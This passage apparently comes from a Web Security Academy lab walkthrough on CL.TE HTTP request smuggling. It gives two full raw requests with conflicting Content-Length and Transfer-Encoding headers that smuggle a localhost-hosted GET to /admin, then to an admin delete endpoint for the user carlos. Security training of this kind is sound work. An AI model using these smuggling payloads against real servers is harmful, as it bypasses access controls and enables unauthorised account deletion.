We can leave here the CL automatic, on this case is a CL.TE so we need to setup the CL, and a 0 for the backend. 
But we need to smuggle a request, there are two thing that we need to pay attention and it is the host, we need to put localhost and the content length on the second request should be enough to include at least 1 character from the next request. 
```
POST / HTTP/1.1
Host:0aa0002a048aa9e989c65651008200b0.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 116
Transfer-Encoding: chunked

0

GET /admin HTTP/1.1
Host: localhost
Content-Type: application/x-www-form-urlencoded
Content-Length: 10

x=
```

Finally, here we only change the URL that is aiming to delete carlos

```
POST / HTTP/1.1
Host:0aa0002a048aa9e989c65651008200b0.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 139
Transfer-Encoding: chunked

0

GET /admin/delete?username=carlos HTTP/1.1
Host: localhost
Content-Type: application/x-www-form-urlencoded
Content-Length: 10

x=
